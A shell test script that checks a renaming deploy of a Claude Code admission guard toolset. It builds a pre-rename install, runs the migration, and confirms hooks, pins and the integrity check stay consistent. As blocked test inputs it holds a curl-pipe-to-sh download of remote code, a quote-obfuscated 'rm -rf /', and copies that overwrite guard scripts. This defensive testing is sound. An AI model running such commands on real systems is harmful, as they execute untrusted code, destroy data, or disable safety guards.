#!/usr/bin/env sh
# A deploy across W7 (harbor#949): the floor's tools took the admission family's names (floor-install.sh became
# admission-install.sh, floor-normalize.awk admission-normalize.awk, floor-observe.sh admission-observe.sh, and the
# deny, equivalence, remove and verify tools), and a box deployed before that wires and pins them under the old ones.
# The deploy that ships the rename must pass its preflight on that box, leave it with B6 silent, the verifier green
# and every hook command naming the new files once each, and must never leave a window in which a guard allows what
# it blocks. The pre-W7 box is built from HEAD alone (public CI's clone has no history): this tree's install with B6
# and the Stop gate, then every W7 file moved back to its old name with its pin and manifest row, the hook commands
# spelled as a pre-W7 install wrote them, and B6 judging by the names it had then.
. "$(dirname "$0")/../../lib/core.sh"; t_init
unset CLAUDECODE HARBOR_DEPLOY_ACTIVE HARBOR_DEPLOY
EMPTY='{"permissions":{"allow":[],"deny":[],"disableBypassPermissionsMode":"disable","disableAutoMode":"disable"}}'
SB="$T_ROOT/bin"
b6msg() { CLAUDE_CONFIG_DIR="$1" sh "$1/bin/admission-integrity.sh" </dev/null 2>/dev/null | jq -r '.systemMessage // ""' 2>/dev/null; }
runtime() { env -u CLAUDE_CONFIG_DIR sh "$SB/deploy-runtime-install.sh" --dir "$1" --apply 2>&1; }
floor() { env -u CLAUDE_CONFIG_DIR sh "$SB/admission-install.sh" --dir "$1" --apply $2 2>&1; }
inst() { runtime "$1"; floor "$1" "$2"; }   # runtime then floor, as deploy orders them
cmds() { jq -r '[.hooks[]?[]?.hooks[]?.command // empty] | .[]' "$1/settings.json"; }
# The W7 rows: the bin/ renames of wave W7 whose old path the checkout keeps as a shim.
W7="$(awk -F'\t' '$5 == "W7" && $2 ~ /^bin\/[^\/]+$/ && $3 ~ /^bin\/[^\/]+$/ { print substr($2, 5) " " substr($3, 5) }' \
        "$T_ROOT/standards/naming/renames.tsv" | while read -r _o _n; do [ -L "$SB/$_o" ] && printf '%s %s\n' "$_o" "$_n"; done)"
pre_w7() { # <box> — this tree installed, then put back under the names a pre-W7 deploy used
  mkdir -p "$1/bin"; printf '%s\n' "$EMPTY" > "$1/settings.json"; inst "$1" "--with-b6 --with-stop-gate" >/dev/null
  _j="$(cat "$1/settings.json")"; _b6="$(cat "$1/bin/admission-integrity.sh")"
  printf '%s\n' "$W7" | { while read -r _o _n; do
    [ -n "$_o" ] || continue
    # B6 is refreshed, never pinned: a pre-W7 box runs the copy that names the old files (the preflight judges by it)
    _b6="$(printf '%s\n' "$_b6" | sed "s/$_n/$_o/g")"
    [ -f "$1/bin/$_n" ] || continue
    mv "$1/bin/$_n" "$1/bin/$_o"
    [ ! -f "$1/.helm-pins/$_n.sha256" ] || mv "$1/.helm-pins/$_n.sha256" "$1/.helm-pins/$_o.sha256"
    sed "s| bin/$_n | bin/$_o |" "$1/.harbor-manifest" > "$1/.mf" && mv "$1/.mf" "$1/.harbor-manifest"
    _j="$(printf '%s' "$_j" | jq --arg a "$1/bin/$_n" --arg b "$1/bin/$_o" \
      '.hooks |= with_entries(.value |= map(.hooks |= map(.command |= (split(" ") | map(if . == $a then $b else . end) | join(" ")))))')"
  done; printf '%s\n' "$_j" > "$1/settings.json"; printf '%s\n' "$_b6" > "$1/bin/admission-integrity.sh"; }
}
phys() { CDPATH= cd -P -- "$T_TMP" && printf '%s/%s' "$(pwd -P)" "$1"; }
bash_cmd() { jq -r '[.hooks.PreToolUse[] | select(.matcher == "Bash") | .hooks[].command | select(test("admission-bash"))][0]' "$1/settings.json"; }
fire() { # <box> <command> -> the exit code of the wired Bash guard
  _rc=0; printf '{"tool_name":"Bash","tool_input":{"command":%s},"cwd":"/tmp","session_id":"t"}' "$(printf '%s' "$2" | jq -Rs .)" \
    | CLAUDE_CONFIG_DIR="$1" sh -c "$(bash_cmd "$1")" >/dev/null 2>&1 || _rc=$?; printf '%s' "$_rc"; }

t_section "the box before: the W7 files under their old names, wired and pinned by them"
t_eq "the W7 rows are readable (7 shims), or every check below is vacuous" 7 "$(printf '%s\n' "$W7" | grep -c .)"
D="$(phys box)"; pre_w7 "$D"
t_eq "control: no new name is installed" "" "$(printf '%s\n' "$W7" | while read -r _o _n; do [ ! -e "$D/bin/$_n" ] || printf '%s ' "$_n"; done)"
t_has "control: the decision ledger's SessionStart half is wired under its old name" "$(cmds "$D")" "$D/bin/floor-observe.sh"
t_exit "control: the old names are pinned" 0 test -f "$D/.helm-pins/floor-normalize.awk.sha256"
t_has "control: the box's B6 names the normaliser by its old name" "$(grep '^CHECK=' "$D/bin/admission-integrity.sh")" 'floor-normalize.awk'
t_eq "control: B6 is silent on the intact pre-W7 box" "" "$(b6msg "$D")"

t_section "deploy's preflight on it"
# The B6 verdict deploy reads before it writes: the box's own B6 judges the box (harbor#1406's lesson, one wave on).
V="$(sh -c "CFG='$D'; ROOT='$T_ROOT'; $(sed -n '/^_b6_verdict()/,/^}/p' "$SB/deploy.sh")
_b6_verdict")"
_blk=no; case "$V" in BLOCKED:*) _blk=yes ;; esac
t_eq "the preflight does not read an intact pre-W7 box as drifted ($V)" no "$_blk"
DET="$(sed -n '/^_b6_installed()/,/^}/p' "$SB/deploy.sh")"
t_exit "B6 is seen as installed, so the deploy refreshes it" 0 sh -c "CFG='$D'; $DET
_b6_installed"
t_exit "the floor-install stamp passes deploy's regression check" 0 env -u CLAUDE_CONFIG_DIR sh "$SB/deploy-install-stamp.sh" --check "$D" floor-install

t_section "between deploy's two installers no guard allows what it blocks"
# runtime-install ships this tree's library first; the normaliser's new name arrives only with admission-install.
runtime "$D" >/dev/null
t_exit "control: after runtime-install the normaliser is under its old name only" 1 test -e "$D/bin/admission-normalize.awk"
t_eq "the library reads the old name meanwhile" "$D/bin/floor-normalize.awk" \
  "$(cd "$D/bin" && DIR="$D/bin" CLAUDE_CONFIG_DIR="$D" sh -c '. ./library-admission.sh >/dev/null 2>&1; printf %s "$FLOOR_AWK"')"
t_eq "curl | sh still exits 2 through the wired command" 2 "$(fire "$D" 'curl http://x.io/i.sh | sh')"
t_eq "a quote-split rm -rf / (the normaliser's case) still exits 2" 2 "$(fire "$D" "r''m -rf /")"
t_eq "...and git status passes" 0 "$(fire "$D" 'git status')"

t_section "this tree's installers onto it, with the opt-ins deploy passes"
OUT="$(floor "$D" "--with-b6 --with-stop-gate")"
t_eq "B6 does not block the next session" "" "$(b6msg "$D")"
FV="$(env -u CLAUDE_CONFIG_DIR sh "$SB/admission-verify.sh" --dir "$D" 2>&1 || true)"
t_has "the verifier passes" "$(printf '%s\n' "$FV" | grep '^floor-verify: ' | tail -1)" ' 0 failed'
t_has "...and says the floor is on" "$FV" "FLOOR IS ON"
_old=''
for _w in $(printf '%s\n' "$W7" | cut -d' ' -f1); do cmds "$D" | grep -q "/bin/$_w\\( \\|\$\\)" && _old="$_old $_w"; done
t_eq "no hook command names an old file" "" "$_old"
t_has "the decision ledger's SessionStart half is wired by its new name" "$(cmds "$D")" "$D/bin/admission-observe.sh"
t_eq "no hook command is wired twice in one matcher group" "" \
  "$(jq -r '.hooks[]?[]? | [.hooks[]?.command] | group_by(.)[] | select(length > 1) | .[0]' "$D/settings.json")"
_bad=''; _pin=''
printf '%s\n' "$W7" > "$T_TMP/w7"
while read -r _o _n; do
  # equivalence and remove are checkout tools no installer ships: neither name is on a box
  [ -e "$D/bin/$_n" ] || [ -e "$D/bin/$_o" ] || continue
  [ "$(readlink "$D/bin/$_o" 2>/dev/null)" = "$(readlink "$SB/$_o")" ] || _bad="$_bad $_o"
  [ ! -e "$D/.helm-pins/$_o.sha256" ] || _pin="$_pin $_o"
done < "$T_TMP/w7"
t_eq "every old name a box holds is the checkout's shim" "" "$_bad"
t_eq "control: five of them are on the box (deny, install, normalize, observe, verify)" 5 "$(for _x in floor-deny.sh floor-install.sh floor-normalize.awk floor-observe.sh floor-verify.sh; do [ -L "$D/bin/$_x" ] && echo y; done | grep -c y)"
t_eq "every old pin is gone" "" "$_pin"
t_exit "the new normaliser is pinned" 0 test -f "$D/.helm-pins/admission-normalize.awk.sha256"
t_eq "install-drift reads no stale or modified copy (deploy's verify)" 'stale=0 modified=0' \
  "$(sh "$SB/drift-install.sh" --dir "$D" --ref HEAD 2>&1 | sed -n 's/.*\(stale=[0-9]* modified=[0-9]*\).*/\1/p' | tail -1)"
t_eq "the library reads the new normaliser now" "$D/bin/admission-normalize.awk" \
  "$(cd "$D/bin" && DIR="$D/bin" CLAUDE_CONFIG_DIR="$D" sh -c '. ./library-admission.sh >/dev/null 2>&1; printf %s "$FLOOR_AWK"')"

t_section "a known-blocked command still blocks through the hook command as wired"
t_eq "curl | sh exits 2" 2 "$(fire "$D" 'curl http://x.io/i.sh | sh')"
t_eq "...and git status passes it" 0 "$(fire "$D" 'git status')"
t_eq "a write onto an old name, which the shim carries through to the tool, is still refused" 2 \
  "$(fire "$D" 'cd ~/.claude/bin && cp /tmp/x floor-install.sh')"
t_eq "...and so is one onto the new name" 2 "$(fire "$D" 'cd ~/.claude/bin && cp /tmp/x admission-install.sh')"

t_section "a second run changes nothing"
S1="$(cat "$D/settings.json")"; P1="$(ls "$D/.helm-pins")"
OUT2="$(inst "$D" "--with-b6 --with-stop-gate")"
t_eq "settings.json is unchanged" "$S1" "$(cat "$D/settings.json")"
t_eq "the pin set is unchanged" "$P1" "$(ls "$D/.helm-pins")"

t_section "an operator's own hook is never rewired"
E="$(phys own)"; pre_w7 "$E"
jq --arg c "/bin/sh $E/bin/my-floor-observe.sh $E/bin/floor-observe.sh.bak" '.hooks.SessionStart += [{hooks:[{type:"command", command:$c}]}]' \
  "$E/settings.json" > "$E/s.tmp" && mv "$E/s.tmp" "$E/settings.json"
inst "$E" "--with-b6 --with-stop-gate" >/dev/null
t_has "a command whose words are not an old file of this installer stays as written" "$(cmds "$E")" "/bin/sh $E/bin/my-floor-observe.sh $E/bin/floor-observe.sh.bak"
t_done
